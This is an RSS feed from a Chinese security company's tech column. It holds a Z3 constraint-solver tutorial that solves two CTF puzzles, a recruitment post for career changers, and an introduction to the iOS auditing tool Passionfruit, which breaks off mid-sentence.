<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Mon, 30 Oct 2017 11:02:37 +0800</lastBuildDate>
<item>
<title>Z3一把梭：用约束求解搞定一类CTF题</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-29-30548907.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Z3一把梭：用约束求解搞定一类CTF题&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30548907&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ab18970a5c5801d979023ff5ef808f23_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Z3 简介&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Z3Prover/z3&quot;&gt;Z3&lt;/a&gt; 是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比喻其实还差距甚远，请勿吐槽），功能强大且易于使用，本文以近期的 CTF 题为实例，向尚未接触过约束求解器的小伙伴们介绍 Z3 在 CTF 解题中的应用。&lt;/p&gt;&lt;p&gt;Z3 约束求解器是针对 &lt;a href=&quot;https://en.wikipedia.org/wiki/Satisfiability_modulo_theories&quot;&gt;Satisfiability modulo theories Problem&lt;/a&gt; 的一种通用求解器。所谓 SMT 问题，在 Z3 环境下是指关于算术、位运算、数组等背景理论的一阶逻辑组合决定性问题。虽然 Z3 功能强大，但是从理论上来说，大部分 SMT 问题的时间复杂度都过高，根本不可能在有限时间内解决。所以千万不要把 Z3 想象得过于万能。&lt;/p&gt;&lt;p&gt;Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 &lt;a href=&quot;http://angr.io/&quot;&gt;angr&lt;/a&gt; 也内置了一个修改版的 Z3。&lt;/p&gt;&lt;p&gt;Z3 本身提供一个类似于 Lisp 的内置语言，但是实际使用中，一般使用 Python Binding 操作会比较方便。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://z3prover.github.io/api/html/namespacez3py.html&quot;&gt;http://z3prover.github.io/api/html/namespacez3py.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://pypi.python.org/pypi/z3-solver/4.5.1.0&quot;&gt;https://pypi.python.org/pypi/z3-solver/4.5.1.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://ericpony.github.io/z3py-tutorial/guide-examples.htm&quot;&gt;https://ericpony.github.io/z3py-tutorial/guide-examples.htm&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;Z3 入门&lt;/h2&gt;&lt;p&gt;Z3 内置了多种变量类型，基本能覆盖常见计算机数据结构。包括整数、浮点数、BitVector、数组等。&lt;/p&gt;&lt;p&gt;先来一个简单的例子看一下 Z3 能做什么：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;from z3 import *

x = Int(&#39;x&#39;)
y = Int(&#39;y&#39;)
solve(x &amp;gt; 2, y &amp;lt; 10, x + 2*y == 7) &lt;/code&gt;&lt;p&gt;上面的例子中，定义了两个变量：x 和 y。类型为 Int（注意这里的 Int 可不是 C/C++ 里面包含上下界的 int，Z3 中的 Int 对应的就是数学中的整数，Z3 中的 BitVector 才对应到 C/C++ 中的 int）。&lt;/p&gt;&lt;p&gt;然后就调用了 &lt;code class=&quot;inline&quot;&gt;solve&lt;/code&gt; 函数求解三个条件下的满足模型，这三个条件分别是 x 大于 2，y 小于 10，并且 x 加 2 个 y 等于 7。&lt;/p&gt;&lt;p&gt;运行一下结果：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ python example.py 
[y = 0, x = 7] &lt;/code&gt;&lt;p&gt;可以看出，Z3 找到了 y=0，x=7 这组解。细心的小伙伴会发现，x=5,y=1 也符合条件，为什么没有体现？原因在于 Z3 在默认情况下，只寻找满足所有条件的一组解，而不是找出所有解。&lt;/p&gt;&lt;p&gt;好了，经过上面的简单介绍相信大家都对 Z3 有一个基本的认识，下面看看在 CTF 实际应用。&lt;/p&gt;&lt;h2&gt;Z3 实战样题一：DEFCAMP 2017 Misc 题 forgot my key&lt;/h2&gt;&lt;p&gt;题目如下：&lt;/p&gt;&lt;p&gt;I forgot my flag &amp;amp; key. Help me recover them.&lt;/p&gt;&lt;p&gt;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function my_encrypt($flag, $key) {
  $key = md5($key);
  $message = $flag . &quot;|&quot; . $key;

  $encrypted = chr(rand(0, 126));
  for($i=0;$i&amp;lt;strlen($message);$i++) {
    $encrypted .= chr((ord($message[$i]) + ord($key[$i % strlen($key)]) + ord($encrypted[$i])) % 126);
  }
  $hexstr = unpack(&#39;h*&#39;, $encrypted);
  return array_shift($hexstr);
}
&lt;/code&gt;&lt;p&gt;这题给了一个加密函数，要求还原 flag 和 key。观察可以发现，加密串每一位都与明文、key、和加密串的前一位相关。但是由于第一位是随机出来的，所以很难从开头递推出来。但是细心观察 message 的构成又可以发现，后面 32 位是 key 的 md5 串，倒数第 33 位又是已知，因此从这里就可以打开突破口。整理思路如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;第一步：通过倒数第 33 位明文已知，且密文已知，因此可以求得某一位 md5($key) 的值。&lt;/li&gt;&lt;li&gt;第二步：根据上一步推出来的值，又可以进一步推另一位 message 的值。如此往复下去，最终应该能找到所有的值。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;思路是有了，然而写起来未必简单，因为人的思维都是正向的，逆向求解特别是还要写出完整求解代码总是麻烦的。&lt;/p&gt;&lt;p&gt;于是我们考虑是否可以使用 Z3 来求解。首先题目肯定保证了答案的唯一性，因此 Z3 求解成功就会得到 flag 无疑。其次，我们根据题目的变换方式，给 Z3 所有的正推关系式，把逆推的逻辑让 Z3 通过约束求解来完成，由于逆推可以一步步进行，因此也不会导致 Z3 复杂度爆炸求解不出来。如此分析应该 Z3 一把梭问题不大。&lt;/p&gt;&lt;p&gt;代码如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#!/usr/bin/env python3

from z3 import *
import binascii

s = &#39;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&#39;

encrypted = []
for i in range(0, len(s), 2):
    encrypted.append(binascii.unhexlify(s[i+1] + s[i])[0])

print(&#39;message len:&#39;, len(encrypted)-1)
print(encrypted)
# 声明变量，encrypted 是已知，因此 IntVal 即可
encrypted = [IntVal(i) for i in encrypted]
message = [Int(&#39;flag%d&#39; % i) for i in range(len(encrypted)-1)]
# 创建一个求解器，求解全靠它
solver = Solver()

ml = len(encrypted) - 1

# 添加明文字符的约束条件
for i in range(ml):
    if i == ml - 33:
        solver.add(message[i] == ord(&#39;|&#39;))
    else:
        # 肯定是可见字符，因此限定范围如下
        solver.add(message[i] &amp;lt; 127)
        solver.add(message[i] &amp;gt;= 32)
# 添加明文和密文对照关系的约束条件
for i in range(ml):
    solver.add(encrypted[i+1] == (message[i] + message[ml-32+i%32] + encrypted[i]) % 126)

if solver.check() == sat:
    m = solver.model()
    s = []
    for i in range(ml):
        s.append(m[message[i]].as_long())
    print(bytes(s))
else:
    print(&#39;unsat&#39;) &lt;/code&gt;&lt;p&gt;运行求解：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ time python solve.py 
message len: 103
b&#39;DCTF{0d940de38493d96dc6255cbb2c2ac7a2db1a7792c74859e95215caa6b57c69b2}|6941f4cac9b7784fdd77e11b51cd0d64&#39;

real	0m7.277s
user	0m7.260s
sys	0m0.010s &lt;/code&gt;&lt;p&gt;在我的 Mac 上总共耗时 7s。从这个 &lt;a href=&quot;http://solve.py/&quot;&gt;solve.py&lt;/a&gt; 可以看出，由于使用了 Z3，求解整个题目所需要做的事情基本就是照着原来的逻辑照抄翻译一遍，再添加其他细节（如可见字符范围在32到127之间），然后求解，就大功告成了！&lt;/p&gt;&lt;h2&gt;z3 实战样题二：CSAW 2017 逆向题 realism&lt;/h2&gt;&lt;p&gt;前面是一道简单的 misc/crypto 题目，这里再展示 Z3 在一道逆向题的应用。 realism 是一个主要针对 x86 &lt;a href=&quot;https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions&quot;&gt;SSE 指令&lt;/a&gt; 的逆向题目。题目可以从 &lt;a href=&quot;https://github.com/youben11/CSAW_2017_quals_rev400&quot;&gt;https://github.com/youben11/CSAW_2017_quals_rev400&lt;/a&gt; 获取。&lt;/p&gt;&lt;p&gt;题目的主要逻辑其实并不长，但是由于应用了 SSE 指令，且同样是一番循环逻辑运算之后，要求运算结果与某个预设值相等，逆向起来有一定复杂度。关键逻辑如下图：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0b294784dcae9d6b0bcee51759487f3c_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;2032&quot; data-rawheight=&quot;927&quot;&gt;&lt;p&gt;把逻辑整理成伪代码如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;xmm5 = results[0]

for i in range(8, 0, -1):
    xmm2 = andps(flag, bytes(masks[i:i+8]))
    xmm5 = psadbw(xmm5, xmm2)
    assert xmm5 == results[9-i] &lt;/code&gt;&lt;p&gt;同样的，如果要根据结果逆推，首先需要理解清楚每一个指令的精确含义，然后需要做大量的逆推工作。因此考虑是否可以用 Z3 从正向思维来解决这类问题。&lt;/p&gt;&lt;p&gt;这里的难点在于要准确模拟 andps 和 psadbw 两个指令的行为。此外，需要选择正确的 BitVector 大小。因为 8 位会导致 psadbw 加法溢出得到错误的值，因此这里统一使用 16 位。&lt;/p&gt;&lt;p&gt;程序如下： &lt;a href=&quot;https://gist.github.com/zTrix/036d904e85946fa273067f184210a6de&quot;&gt;https://gist.github.com/zTrix/036d904e85946fa273067f184210a6de&lt;/a&gt;&lt;/p&gt;&lt;p&gt;运行我们的程序：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ time python3 solve.py 
b&#39;flag{4r3alz_m0d3_y0}&#39;

real	0m0.788s
user	0m0.790s
sys	0m0.000s &lt;/code&gt;&lt;p&gt;仅需 0.8s 即可解出结果。&lt;/p&gt;&lt;h2&gt;总结&lt;/h2&gt;&lt;p&gt;合理使用 Z3 可以在许多场景下根据约束自动帮助我们求解，只需要根据正向思路使用 Z3 表达原有逻辑即可，大大减少我们分析和逆推的时间。当然，Z3 的功能远不止这些，这里只是介绍了最简单的入门应用，有兴趣的小伙伴可以通过阅读文档资料进一步了解。&lt;/p&gt;&lt;h2&gt;参考资料&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://rise4fun.com/z3&quot;&gt;https://rise4fun.com/z3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/Z3Prover/z3/wiki/Slides&quot;&gt;https://github.com/Z3Prover/z3/wiki/Slides&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://z3prover.github.io/api/html/index.html&quot;&gt;http://z3prover.github.io/api/html/index.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://research.microsoft.com/en-us/um/redmond/projects/z3/z3.pdf&quot;&gt;http://research.microsoft.com/en-us/um/redmond/projects/z3/z3.pdf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://rise4fun.com/z3/tutorialcontent/guide&quot;&gt;Z3 - Guide&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(长亭技术专栏原创文章，转载请注明来源)&lt;/p&gt;</description>
<author>朱文雷</author>
<guid isPermaLink="false">2017-10-29-30548907</guid>
<pubDate>Sun, 29 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>好胆你就来！长亭科技CROSS计划：跨专业招聘计算机人才</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-27-30515472.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;好胆你就来！长亭科技CROSS计划：跨专业招聘计算机人才&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30515472&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-550fa0c48fdc0b4ab5d1281c4cc098fd_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;我大学的时候学了一份&lt;b&gt;特别牛逼、高大上&lt;/b&gt;的专业——生物科学。&lt;br&gt;至于为啥我学了这个专业，不知道是哪个神人在我报志愿之前，天天吹捧&lt;b&gt;21世纪是生物学的天下&lt;/b&gt;！&lt;br&gt;当时研究了三个专业：生物工程、生物技术、生物科学，&lt;b&gt;只有这个生物科学听起来是最为牛逼&lt;/b&gt;的。&lt;br&gt;现在看起来依然牛逼，毕业之后工作也确实难找。&lt;br&gt;其实除了班里一半深造的，其他的人只有一个从事了生物行业。&lt;br&gt;最为蛋疼的是，好几个准备考公务员却止步于专业限制，我们这个专业考公务员都受限！&lt;br&gt;那位说21世纪是生物学的神人同志，现在我要来跟你聊一下人生聊一下理想。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;我是正在找工作的应届师范生。&lt;br&gt;当初选了服从调剂专业，教育技术，开始一年都不知道干嘛的，大概就是中学信息技术老师。&lt;br&gt;当时觉得当个副科老师不错啊！&lt;br&gt;真正找工作了才发现，市场需求太少！！&lt;br&gt;&lt;b&gt;没几个学校缺信息技术老师的！！！&lt;/b&gt;&lt;br&gt;语文数学的一招就是几十个，信息技术一两个或者压根不要，不当老师又不知道还能干嘛？&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;本科生物，学霸，&lt;b&gt;成绩top 1％&lt;/b&gt;，&lt;br&gt;然后，大四没有找到工作……&lt;br&gt;怒而考研，&lt;b&gt;跨专业，挑战CS&lt;/b&gt;（计算机）&lt;br&gt;真是比高三还辛苦，高三时无知者无畏，没什么压力。&lt;br&gt;虽然之前一直努力，但稳稳妥妥生物与CS，风马牛不相及啊。&lt;br&gt;&lt;b&gt;考研努力流过的汗都是当年选专业时脑子进的水啊~&lt;/b&gt;&lt;br&gt;都说转行毁三年，诚然，我三年的生物学积累毁于一旦。&lt;br&gt;然，不转，毁我一生！&lt;br&gt;不过，“21世纪是生物的世纪”，现在毕竟只是世纪之初，以后的事谁又能预料。&lt;br&gt;不过，不会后悔。我爱CS，JUST DO IT!&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;这些案例，是不是看着有些眼熟？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;说的就是你对不对？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;（备注：以上并不是吐槽任何专业不好，而是部分专业确实存在就业难的问题，请勿吐槽）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;影影绰绰中，我们提出一个大胆的想法！&lt;/p&gt;&lt;p&gt;&lt;b&gt;不！限！专！业！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;醉心CS，爱钻研，懂技术，享受成就的你们！&lt;/p&gt;&lt;p&gt;&lt;b&gt;有胆量，来长亭试试吧！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;不是怂恿放弃其他专业，而是当你心中有这个声音时，多给你一个选择！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;CROSS计划&lt;/b&gt;，是长亭科技为发掘在计算机领域中拥有独到见解与研究的&lt;b&gt;非计算机专业人才&lt;/b&gt;而决定每年保留的校招计划！接头口号： &lt;b&gt;好胆你就来！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;不管你学什么专业，建筑、土木、数学甚至是与计算机毫不相关的文科生，只要你对计算机领域拥有浓厚的兴趣，且在业余时间：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;花了足够的精力去钻研，&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;有扎实的数理基础，&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;有独立的思考和研究态度&lt;/b&gt;，&lt;/p&gt;&lt;p&gt;&lt;b&gt;我们统统欢迎！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;其实，我们也&lt;b&gt;怕&lt;/b&gt;！&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;这个活动没有那么多人响应，&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;你们害怕自己技术不行，&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;有人觉得长亭这个提议太理想国了！&lt;/p&gt;&lt;p&gt;While，我们选择站了出来，毕竟，&lt;/p&gt;&lt;p&gt;&lt;b&gt;放胆迈出第一步，才有可能将理想变成现实！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;所以，邀请您，你，恁，&lt;b&gt;好胆你就来&lt;/b&gt;！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;不是计算机专业≠不是计算机人才&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当你心中有这个声音时，多给你一个选择。&lt;/p&gt;&lt;p&gt;大胆地迈出这一步，做自己真正想做的事情。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你可以跟随技术大牛光速起步，迅速打下扎实的计算机功底。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你可以参与各种规范的工程项目，快速积累丰富的工程经验。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你还可以接触最新最酷的黑客技术，见证各种魔术般颠覆想象的神奇。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;而以上通通不是吹牛，因为我们有足够多的转行成功案例，他们来自于不同的专业：数学、水利、航空航天、航海、机械等等等等，哦差点忘了，还。。。还有秘书专业。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;应届毕业生通过CROSS计划：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;1. 进入长亭科技产品研发部门实习&lt;/p&gt;&lt;p&gt;2. 获得长亭技术大佬&lt;b&gt;1对1指导&lt;/b&gt;的珍贵机会（CTO亲自参与）&lt;/p&gt;&lt;p&gt;3. 更有毕业后直接转正的机会！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;友情提示：&lt;/p&gt;&lt;p&gt;长亭是一个对技术期望颇高的团队，&lt;/p&gt;&lt;p&gt;然而我们更看重的，&lt;/p&gt;&lt;p&gt;是你思考问题的思路，&lt;/p&gt;&lt;p&gt;看待世界的角度！&lt;/p&gt;&lt;p&gt;如果刚好你也这样，那就来吧！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;计算机专业的同学也不要自卑，&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;简历也不会被扔出去！&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;除了研发岗位，&lt;b&gt;市场、销售、技术支持&lt;/b&gt;等岗位也在期待你的加入！具体岗位信息请戳长亭科技官网（&lt;a href=&quot;https://chaitin.cn/cn/join-us.html&quot;&gt;https://chaitin.cn/cn/join-us.html&lt;/a&gt;）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;简历投递传送门：hr@chaitin.com&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;邮件主题请注明 “CROSS计划”！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;来！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>朱文雷</author>
<guid isPermaLink="false">2017-10-27-30515472</guid>
<pubDate>Fri, 27 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>开源！iOS 应用安全分析工具 Passionfruit</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-15-29761306.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;开源！iOS 应用安全分析工具 Passionfruit&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29761306&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e590742eb8fe8628767544ef478ee70d_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;Github 项目地址 &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;chaitin/passionfruit&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;前情提要&lt;/h2&gt;&lt;p&gt;虽然没有 Android 平台那么多的攻击面和利用姿势，iOS 应用依然有安全审计的需求。移动平台的安全目前采用的策略基本上都是扫描器加上一部分人工的逆向和动态分析。&lt;/p&gt;&lt;p&gt;针对 iOS 应用攻击面分析，目前笔者了解或使用过的相关工具如下（除去逆向工程使用的调试器和反汇编工具）：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Snoop-It（已停止维护）&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/dmayer/idb&quot;&gt;dmayer/idb&lt;/a&gt; idb is a tool to simplify some common tasks for iOS pentesting and research&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/mwrlabs/needle&quot;&gt;mwrlabs/needle&lt;/a&gt; The iOS Security Testing Framework&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/sensepost/objection&quot;&gt;sensepost/objection&lt;/a&gt; 📱 objection - runtime mobile exploration&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/iSECPartners/Introspy-iOS&quot;&gt;iSECPartners/Introspy-iOS&lt;/a&gt; IntroSpy&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在使用中笔者多多少少遇到了一些问题，例如 needle 在设备上需要部署过多依赖包，idb 不兼容 iOS 10，Introspy 虽好但查询日志数据库有一些麻烦……忍不住开始造轮子。&lt;/p&gt;&lt;p&gt;审计工具所需功能大体有如下几个方面：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;分析应用是否开启了必要的编译器保护&lt;/li&gt;&lt;li&gt;分析应用沙盒内的文件内容和权限&lt;/li&gt;&lt;li&gt;分析应用使用到的 framework 和动态链接库&lt;/li&gt;&lt;li&gt;分析应用存储的数据，如 UserDefaults, BinaryCookie 和 KeyChain&lt;/li&gt;&lt;li&gt;分析剪贴板的使用&lt;/li&gt;&lt;li&gt;动态拦截和分析 Objective C 运行时方法&lt;/li&gt;&lt;li&gt;动态拦截和分析本地代码的参数调用和堆栈追踪&lt;/li&gt;&lt;li&gt;分析 UIView 的层级结构和属性&lt;/li&gt;&lt;li&gt;一些基于 hook 实现的修改功能，如设备特征伪造、绕过越狱检测、绕过 SSL Pinning 等&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-869fa78c8cd0772eaf1d44711a7e471a_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1556&quot;&gt;&lt;p&gt;&lt;i&gt;应用目前仍然在开发中，可能会有 bug 或功能缺失。&lt;/i&gt;&lt;/p&gt;&lt;h2&gt;设计&lt;/h2&gt;&lt;p&gt;在实现方案上，笔者选择了功能极为强大的 hook 框架 &lt;a href=&quot;https://www.frida.re/&quot;&gt;frida.re&lt;/a&gt;。关于这个框架不需要我再过多介绍，它在 iOS 平台上支持对 native 函数、Objective C 运行时的 hook 和调用，可以满足多种移动安全运行时分析的自动化需求。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5b1570480dfb0ae145555cb3a44b73fe_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;817&quot; data-rawheight=&quot;318&quot;&gt;&lt;p&gt;Passionfruit 通过 frida 注入代码到目标应用实现功能，再通过 node.js 服务端消息代理与浏览器通信，用户通过访问网页即可对 App 实现常规的检测任务。&lt;/p&gt;&lt;h2&gt;安装和使用&lt;/h2&gt;&lt;p&gt;请访问 GitHub 上的项目主页 &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;chaitin/passionfruit&lt;/a&gt; 来获取最新的版本和更新信息。&lt;/p&gt;&lt;p&gt;Passionfruit 的编译和安装依赖如下软件：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nodejs.org/&quot;&gt;node.js&lt;/a&gt; 用于运行服务端。可根据个人喜好使用 &lt;a href=&quot;https://yarnpkg.com/&quot;&gt;yarn&lt;/a&gt; 或默认的 &lt;a href=&quot;https://www.npmjs.com/&quot;&gt;npm&lt;/a&gt; 作为包管理&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/libimobiledevice/libimobiledevice&quot;&gt;libimobiledevice&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;安装步骤&lt;/p&gt;&lt;ol&gt;&lt;li&gt;安装 node.js 和 libimobiledevice&lt;/li&gt;&lt;li&gt;通过 git 将代码仓库同步到本地&lt;/li&gt;&lt;li&gt;在越狱 iOS 设备上安装 frida&lt;/li&gt;&lt;li&gt;在非越狱设备上使用 ipa 重打包注入 fridagadget.dylib&lt;/li&gt;&lt;li&gt;第一次使用前，在代码根目录运行 npm run build 构建前端代码&lt;/li&gt;&lt;li&gt;运行 npm start 运行服务端，在浏览器中访问 localhost:31337&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;功能和演示&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;video id=&quot;None&quot; data-swfurl=&quot;&quot; poster=&quot;https://pic2.zhimg.com/80/v2-2f92b2ec64b187be4cbcaa134b697131_b.jpg&quot; data-sourceurl=&quot;https://www.zhihu.com/video/902688743067090944&quot; data-name=&quot;&quot; data-video-id=&quot;&quot; data-video-playable=&quot;true&quot; data-lens-id=&quot;902688743067090944&quot;&gt;&lt;/video&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Passionfruit 最大特点就是基于 Web 的图形界面。因此你甚至可以在 iPad Pro 这样的移动设备上访问这个图形界面……（需要修改服务端监听的配置）&lt;/p&gt;&lt;p&gt;完全图形化的界面可以快速地找到需要 hook 的函数。由于 C 函数缺少运行时参数类型信息，因此对于这些库函数您需要手动设置一下函数原型。Objective C 可以直接根据反射打印出参数和返回值。&lt;/p&gt;&lt;p&gt;其他工具实现的 checksec 是基于 otool 检查应用的可执行文件，需要在设备上安装额外的依赖，或将文件从设备中同步到本地执行命令。Passionfruit 直接分析内存中映射的内容，因此要快上很多。在文件查看方面，Passionfruit 直接读取应用沙盒内的 Plist、SQLite 数据库，相比先 scp 下载然后查看可以节约一些时间。&lt;/p&gt;&lt;p&gt;Passionfruit 在不少界面都添加了搜索功能，如模块列表、导出符号、Objective C 类，甚至 Plist 这样的序列化数据。&lt;/p&gt;&lt;p&gt;在 iOS 10 中有一个非公开 API UIDebuggingInformationOverlay 可用来在设备上分析界面层级，您可以在 Passionfruit 的 UIDump 面板中点击按钮来激活这个界面。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5dac5ae80092b44c7e266b9aa4937a67_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;p&gt;如果您有单步、界面分析等更高级的调试需求，建议还是使用 debugserver 